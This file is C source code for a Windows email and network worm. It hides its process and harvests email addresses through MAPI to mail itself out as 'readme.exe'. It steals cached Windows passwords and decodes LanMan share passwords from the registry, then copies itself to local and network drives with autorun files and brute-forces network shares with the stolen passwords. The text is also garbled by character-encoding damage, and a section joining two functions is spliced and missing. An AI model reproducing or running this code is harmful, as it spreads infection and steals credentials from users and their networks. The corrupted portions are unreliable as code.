//防eader-files覧覧覧覧覧覧覧覧覧覧�//
#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#include <io.h>
#include <dos.h>

#include <conio.h>
//謀efines覧覧覧覧覧覧覧覧覧覧覧-//
#define MAX_LENGTH          128
#define MAX_RECIEVERS       50
#define MUTEX_NAME          努0rm�
#define EARTH_WORM_JIM      迭eadme.exe�

#define WORMGAME_PORT       12345
#define WORMGAME_MAX_WINS   10
#define WORMGAME_PKT_PLAY   0xFF
#define WORMGAME_PKT_WIN    0ﾗ80
//鉾lobals覧覧覧覧覧覧覧覧覧覧覧-//
char *ptrEgo, *buf;
char addressList[MAX_RECIEVERS][MAX_LENGTH], passwordList[50][MAX_LENGTH];
int index = 0;

typedef struct tagPASSWORD_CACHE_ENTRY {
    WORD cbEntry;
    WORD cbResource;
    WORD cbPassword;
    BYTE iEntry;
    BYTE nType;
    BYTE abResource[1];
} PASSWORD_CACHE_ENTRY;

typedef struct WormGamePkt {
    BYTE pktType;
    int pktNum;
} AWORMGAMEPACKET;
//貿unction-declarations覧覧覧覧覧覧覧覧蘭//
DWORD WINAPI WormGameThread( LPVOID );
DWORD WINAPI WormMainThread( LPVOID );

BOOL runningNT();
void propogateMAPI( void );
int initMAPI( void );
int validAddress( char * addr );
int sendMessage( int recipNum, LHANDLE lhSession );
int getSharePasswords( void );
int getCachedPasswords( void );
int addPassword( char * pwd );
void propogateDrive( void );
void attackDrive( char * drive, int type );
void propogateNet( LPNETRESOURCE lpnr );
int crackNetShare( char * share );
void releasePayload();

extern 鼎� int __stdcall RegisterServiceProcess( int dwProcessID, int dwType );
//貌ntry-point覧覧覧覧覧覧覧覧覧覧�//
// WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
int main( int argc, char **argv )
{
        HANDLE hMutex, hEgo, hWormGameThread, hWormMainThread;
        DWORD WormGameThreadId, WormMainThreadId;

        // display explorer window if we need to, due to autorun.inf file Smiley
        // test for any command line�

        /* only allow one instance of worm to run on system at one time */
        hMutex = CreateMutex( NULL, TRUE, MUTEX_NAME);
            if(  GetLastError() == ERROR_ALREADY_EXISTS )
            {
                ExitProcess( 0 );
            }

        ptrEgo = argv[0];

        /* try to 蘇ide� the process */
            if( runningNT() == TRUE )
            {
                // hide process in winNT
                printf(埜ORM running on WinNT\n�);
            } else {
                printf(埜ORM running on Win9x\n�);
                LoadLibrary( 適ERNAL32.DLL� );
                RegisterServiceProcess( NULL, 1);
            }

        /* go resident and give worm RAW power */
        hEgo = GetCurrentProcess();
        SetPriorityClass( hEgo, HIGH_PRIORITY_CLASS);

        // create suspended WormMainThread�
        hWormMainThread = CreateThread( NULL, 0, WormMainThread, 0, CREATE_SUSPENDED, &WormMainThreadId);
            if( hWormMainThread != NULL )
            {
                // set thread to time critical� 訴 wana take you higher� - sly and the family stone
                //SetThreadPriority( hWormMainThread, THREAD_PRIORITY_TIME_CRITICAL);
                // resume thread execution�
                ResumeThread( hWormMainThread );
            }
 /*
        // create suspended WormGameThread�
        hWormGameThread = CreateThread( NULL, 0, WormGameThread, 0, CREATE_SUSPENDED, &WormGameThreadId);
            if( hWormGameThread != NULL )
            {
                // resume thread execution�
                ResumeThread( hWormGameThread );
            }                                         
                                                       */
        /* wait for hWormGameThread() to terminate */
     //   WaitForSingleObject( hWormGameThread, INFINITE);
        WaitForSingleObject( hWormMainThread, INFINITE);

        printf(熱AIN_DEBUG: worm threads ended, im outa here: press a key�\n�);
        getch();

        /* release our mutex, next local worm wont get blocked */
            if( hMutex != NULL )
            {
                ReleaseMutex( hMutex );
            }
        return 0;
}

//覧覧覧覧覧覧覧覧覧覧覧覧�-//
DWORD WINAPI WormMainThread( LPVOID )
{
        DWORD dwSize;
        char buff[64];
        printf(埜ormMainThread: started�\n�);
        /* spread worm via MAPI */
        propogateMAPI();
        /* get any passwords we can for use later on */
        getSharePasswords();
        getCachedPasswords();
        dwSize = 64;
        WNetGetUser( NULL, buff, &dwSize );
        addPassword( buff );
        printf(妊EBUG: total pwds got = %d\n�, index);
        /* spread worm via any/all localy maped drives */
        propogateDrive();
        /* spread worm via any/all LAN network shares */
        propogateNet( NULL );
        /* finished our little game Smiley */
        ExitThread( 0 );
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
DWORD WINAPI WormGameThread( LPVOID )
{

        WSADATA w;
        SOCKET s_recv, s_send;
        sockaddr_in saddr, saddr_in, saddr_out;
        int size = sizeof( struct sockaddr ), totalwins = 0, magicWorm = 0, optval;
        AWORMGAMEPACKET gamePkt;
        fd_set fd_read;
        struct timeval timeout = { 5, 0 };

            if( WSAStartup( MAKEWORD(1,0), &w) != 0 )
            {
                printf(埜ormThread: WSAStartup failed\n�);
                goto endThread;
            }

        s_recv = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        s_send = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if( s_recv == INVALID_SOCKET || s_send == INVALID_SOCKET )
            {
                printf(埜ormThread: invalid socket\n�);
                goto endThread;
            }

        memset( &saddr_in, 0ﾗ00, sizeof( struct sockaddr));

        memset( &saddr, 0ﾗ00, sizeof( struct sockaddr));
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons( WORMGAME_PORT );
        saddr.sin_addr.s_addr = INADDR_ANY;

        memset( &saddr_out, 0ﾗ00, sizeof( struct sockaddr) );
        saddr_out.sin_family = AF_INET;
        saddr_out.sin_port = htons( WORMGAME_PORT );
        saddr_out.sin_addr.s_addr = INADDR_BROADCAST;

        optval = 1;
            if( setsockopt( s_send, SOL_SOCKET, SO_BROADCAST , (char*)&optval, sizeof( int) ) == SOCKET_ERROR )
            {
                printf(埜ormThread: setsocketopt failed\n�);
                goto endThread;
            }

            if( bind( s_recv, (struct sockaddr*)&saddr, sizeof( struct sockaddr)) == SOCKET_ERROR )
            {
                printf(埜ormThread: bind failed\n�);
                goto endThread;
            }

        FD_ZERO( &fd_read );
        FD_SET( s_recv, &fd_read );
        randomize();
loop:
        while( 1 )
        {
               if( totalwins >= WORMGAME_MAX_WINS )
                {
                    releasePayload();
                    totalwins = 0;
                }
            // pick a magic number�
            magicWorm = ( ( rand() % 100 ) + 1 );
            printf(埜ormThread: picked a magic num: %d\n�, magicWorm);
            // wait a length of time�
            Sleep( 500 );
            // send my magic number�
            gamePkt.pktType = WORMGAME_PKT_PLAY;
            gamePkt.pktNum = magicWorm;
                if( sendto( s_send, (const char*)&gamePkt, sizeof( struct WormGamePkt ), 0, (struct sockaddr*)&saddr_out, size) == SOCKET_ERROR )
                {
                    printf(埜ormThread: sendto failed\n�);
                    break;
                }

            // handel responces�
                while( select( 0, &fd_read, NULL, NULL, &timeout) != SOCKET_ERROR )
                {
                    if( recvfrom( s_recv, (char*)&gamePkt, sizeof( struct WormGamePkt ), 0, (struct sockaddr*)&saddr_in, &size) == SOCKET_ERROR )
                    {
                        printf(埜ormThread: recvfrom failed\n�);
                        break;
                    } else {
                        switch( gamePkt.pktType )
                        {
                            case WORMGAME_PKT_PLAY: // recieved a magic number�
                                // ignore responce from local machine�
                                printf(埜ormThread: recieved a magic num: %d\n�, gamePkt.pktNum);
                                // process other responces
                                    if( gamePkt.pktNum == magicWorm )
                                    {
                                        // notify any winners
                                        gamePkt.pktType = WORMGAME_PKT_WIN;
                                        saddr_out.sin_addr.s_addr = saddr_in.sin_addr.s_addr;
                                        sendto( s_send, (const char*)&gamePkt, sizeof( struct WormGamePkt ), 0, (struct sockaddr*)&saddr_out, size);
                                        saddr_out.sin_addr.s_addr = INADDR_BROADCAST;
                                    }
                                break;
                            case WORMGAME_PKT_WIN: // im a winner Smiley
                                printf(埜ormThread: IM A WINNER!!!\n�);
                                totalwins++;
                                goto loop;
                            default:   // its all gone bugfuck!
                                printf(埜ormThread: its all gone bugfuck!\n�);
                                break;
                        }
                    }
                } // while(select�
        }
endThread:
        closesocket( s_recv );
        closesocket( s_send );
        ExitThread( 0 );
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
BOOL runningNT()
{
        OSVERSIONINFO osvi;
        BOOL retval = FALSE;

        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&osvi);
            switch( osvi.dwPlatformId )
            {
                case VER_PLATFORM_WIN32_NT:
                    retval = TRUE;
                    break;
                case VER_PLATFORM_WIN32_WINDOWS:
                    retval = FALSE;
                    break;
                default: // VER_PLATFORM_LINUX ? Smiley || VER_PLATFORM_WIN32_ANOTHERBUGGYRELEASE
                    retval = FALSE;
                    break;
            }
        return retval;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
void propogateMAPI( void )
{
        LHANDLE lhSession;
        CHAR rgchMsgID[513];
        MapiMessage *lpMessage;
        int i=0;
            if( initMAPI() != 0 )
            {
                return;
            }
            if( MAPILogon( 0, NULL, NULL, 0, 0, &lhSession) == SUCCESS_SUCCESS)
            {
                *rgchMsgID = NULL;
                    while( i < MAX_RECIEVERS )
                    {
                        if( MAPIFindNext( lhSession, 0L, NULL, rgchMsgID, MAPI_LONG_MSGID, 0L, rgchMsgID) != SUCCESS_SUCCESS)
                        {
                            break;
                        }
                        if( MAPIReadMail( lhSession, 0L, rgchMsgID, MAPI_PEEK, 0L, &lpMessage) == SUCCESS_SUCCESS)
                        {
                    //    printf(妊OING: %s\n\t%s\n�,lpMessage->lpOriginator->lpszAddress,lpMessage->lpRecips->lpszAddress);
                            if( validAddress( lpMessage->lpOriginator->lpszAddress ) == 0 )
                            {
                                strcpy( addressList, lpMessage->lpOriginator->lpszAddress);
                                i++;
                            }
                            if( validAddress( lpMessage->lpRecips->lpszAddress  ) == 0 )
                            {
                                strcpy( addressList, lpMessage->lpRecips->lpszAddress);
                                i++;
                            }
                        }

                    }
                MAPIFreeBuffer( lpMessage );

                // TO DO: sort addressList and remove duplicates�

                //sendMessage( i, lhSession );    // <�- !!!!!!

                MAPILogoff( lhSession, 0L, 0L, 0L);
            }
            for( int x = 0 ; x < i ; x++ )
            {
                printf(妊EBUG: attacking:\t%s\n�, addressList

    * );

            }
        return;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int initMAPI( void )
{
        HINSTANCE hi;
        LPMAPILOGON MAPILogon;
        LPMAPIFINDNEXT MAPIFindNext;
        LPMAPIREADMAIL MAPIReadMail;
        LPMAPISENDMAIL MAPISendMail;
        hi = LoadLibrary( 杜api32.dll� );
            if( hi == NULL )
            {
                return -1;
            }
        MAPILogon = (LPMAPILOGON)GetProcAddress( hi, 溺APILogon�);
        MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress( hi, 溺APIFindNext�);
        MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress( hi, 溺APIReadMail�);
        MAPISendMail = (LPMAPISENDMAIL)GetProcAddress( hi, 溺APISendMail�);
            if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || MAPISendMail == NULL )
            {
                return -1;
            }
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int validAddress( char * addr )
{
        if( strlen( addr ) >= MAX_LENGTH || strlen( addr ) == 0)
        {
            return -1;
        } else if( strchr( addr , 繊�) == NULL )
        {
            return -1;
        } else if( strchr( addr , �.�) == NULL )
        {
            return -1;
        } else {
            return 0;
        }
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int sendMessage( int recipNum, LHANDLE lhSession )
{
        MapiRecipDesc *recips  = (MapiRecipDesc *)malloc( recipNum*sizeof(MapiRecipDesc) );
        MapiFileDesc attachment = { 0, 0, (ULONG)-1, ptrEgo, EARTH_WORM_JIM, NULL};
            for( int i=0 ; i<recipNum ; i++ )
            {
                recips.ulReserved   = 0;
                recips.ulRecipClass = MAPI_TO;
                recips.lpszName     = addressList;
                recips.lpszAddress  = addressList;
                recips.ulEIDSize    = 0;
                recips.lpEntryID    = NULL;
            }
        MapiMessage note = { 0, 典he Subjext�, 典he Message Text�, NULL, NULL, NULL, 0, NULL, recipNum, recips, 1, &attachment};
            if( MAPISendMail( lhSession, 0L, &note, 0L, 0L) != SUCCESS_SUCCESS )
            {
                return -1;
            }
        free( recips );
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int CALLBACK pce(PASSWORD_CACHE_ENTRY *x, DWORD)
{
        memmove(buf, x->abResource+x->cbResource, x->cbPassword);
        buf[x->cbPassword] = 0;
        addPassword( buf );
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int getCachedPasswords( void )
{
        buf = new char[1024];
        HINSTANCE hi = LoadLibrary(芭pr.dll�);
            if( hi == NULL )
            {
                return -1;
            }
        WORD (__stdcall *enp)(LPSTR, WORD, BYTE, void*, DWORD) = (WORD (__stdcall *)(LPSTR, WORD, BYTE, void*, DWORD))GetProcAddress(hi, 展NetEnumCachedPasswords�);
            if( enp == NULL )
            {
                return -1;
            }
        enp( 0, 0, 0xff, pce, 0);
        FreeLibrary( hi );
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
BYTE rotr( BYTE b )
{
        BYTE carry;
        carry = b & 0ﾗ01;
        carry <<= 7;
        b >>= 1;
        b |= carry;
        return b;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
void decodePW( char * pw )
{
        BYTE hash = 0ﾗ35;
            while( pw && *pw )
            {
                *pw = *pw ^ hash;
                pw++;
                hash = rotr( hash );
            }
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int addPassword( char * pwd )
{
            if( (strlen(pwd) > 0) && (strlen(pwd) < MAX_LENGTH) )
            {
                strcpy( passwordList[ index ], pwd);
                printf(妊EBUG: ADDED: %s\n�, passwordList[ index ]);
                index++;
            }
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int getSharePasswords( void ){
        if( runningNT() == FALSE )
        {
            HKEY key, subkey;
            DWORD i, maxKeys, len, junk;
            char keyName[256], wrightPwd[256], readPwd[256];
            RegOpenKeyEx(HKEY_LOCAL_MACHINE, 鉄OFTWARE\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan�, 0, NULL, &key);
            RegQueryInfoKey (key, NULL, NULL, NULL, &maxKeys, NULL, NULL,NULL, NULL, NULL, NULL, NULL);
                if( maxKeys != 0 )
                {
                    for( i=0; i<maxKeys; i++ )
                    {
                        RegEnumKey(key, i, keyName, 256);
                        RegOpenKeyEx(key, keyName, 0, NULL, &subkey);
                        wrightPwd[0] = readPwd[0] = 0;

                        len = 256;
                        RegQueryValueEx(subkey, 撤arm1enc�, NULL, &junk, (BYTE *)wrightPwd, &len);
                        wrightPwd[len] = 0;
                        decodePW(wrightPwd);
                        addPassword( wrightPwd );

                        len = 256;
                        RegQueryValueEx(subkey, 撤arm2enc�, NULL, &junk, (BYTE *)readPwd, &len);
                        readPwd[len] = 0;
                        decodePW(readPwd);
                        addPassword( readPwd );
                    }
                }
            RegCloseKey(subkey);
            RegCloseKey(key);
        }
        return 0;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
void propogateDrive( void )
{
        int length;
        char buff[MAX_LENGTH], *ptr;

        ptr = buff;
        length = GetLogicalDriveStrings( MAX_LENGTH, ptr) ;

        if( length > 0 && length < MAX_LENGTH)
        {
            for( int i=0 ; i<=(length/4) ; i++ )
            {
                    switch( GetDriveType( ptr ) )
                    {
                        case DRIVE_FIXED:
                            // The drive is a local drive.
                            printf(妊RIVE_FIXED: %s\n�, ptr);
                            attackDrive( ptr, 1 );
                            break;
                        case DRIVE_REMOTE:
                            // The drive is a network drive.
                            printf(妊RIVE_REMOTE: %s\n�, ptr);
                            attackDrive( ptr, 1 );
                            break;
                        default:
                            break;
                    }
                *ptr+=1;
            }
        }
        return;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
void attackDrive( char * drive, int type )
{
        FILE *fpAutorun;
        char buff[MAX_LENGTH];
        // copy worm to drive, Attribute = hidden
            if( type == 1 )
            {
                sprintf( buff, �%s%s�, drive, EARTH_WORM_JIM);
            } else {
                sprintf( buff, �%s\\%s�, drive, EARTH_WORM_JIM);
            }
        printf(妊EBUG: propogateDrive: attacking %s\nATTACK REMOTE: %s\n�, drive, buff);
        /*    if( CopyFile( ptrEgo, buff, FALSE) == TRUE && type == 1 )
            {
                // create an Autorun.inf file on drive, Attribute = hidden
                sprintf( buff, �%sAutorun.inf�, drive);
                fpAutorun = fopen(buff, 努�);
                    if( fpAutorun != NULL )
                    {
                        fprintf( fpAutorun, ?.dwUsage & RESOURCEUSAGE_CONTAINER ) )
                                {
                                    propogateNet( &lpnrLocal );
                                } else if( RESOURCETYPE_DISK  == ( lpnrLocal.dwUsage & RESOURCETYPE_DISK ) )
                                {
                                    if( WNetAddConnection( lpnrLocal[ i ].lpRemoteName, NULL, NULL) == ERROR_INVALID_PASSWORD )
                                    {
                                        // try all found password/username combinations�
                                        printf(忍RROR_INVALID_PASSWORD �); printf(尿TTACKING: %s\n�,lpnrLocal[ i ].lpRemoteName );
                                            if( crackNetShare( lpnrLocal[ i ].lpRemoteName ) == 0 )
                                            {
                                                attackDrive( lpnrLocal.lpRemoteName, 0 );
                                                WNetCancelConnection( lpnrLocal.lpRemoteName, FALSE);
                                            }
                                    } else {
                                        attackDrive( lpnrLocal.lpRemoteName, 0 );
                                        WNetCancelConnection( lpnrLocal.lpRemoteName, FALSE);
                                        printf(尿CCESS NOT DENIED �); printf(尿TTACKING: %s\n�,lpnrLocal[ i ].lpRemoteName );
                                    }
                                }
                        }
                    } else if( dwResultEnum != ERROR_NO_MORE_ITEMS ) {
                        break;
                    }
            } while( dwResultEnum != ERROR_NO_MORE_ITEMS );
        GlobalFree( (HGLOBAL) lpnrLocal );
        WNetCloseEnum( hEnum );
        return;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
int crackNetShare( char * share )
{
        int retval = 0;
            for( int i=0 ; i<index ; i++ )
            {
                retval = WNetAddConnection( share , passwordList, NULL );
                if( retval == NO_ERROR && retval != ERROR_INVALID_PASSWORD )   // <蘭 !!! dodgy testing, fix it
                {
                    printf(捻ASS CRACKED: %s : %s\n�, share , passwordList);
                    return 0;
                }
            }
        return -1;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//
void releasePayload()
{
        printf(能n\t!!! PAYLOAD !!!\n�);
        return;
}
//覧覧覧覧覧覧覧覧覧覧覧覧�-//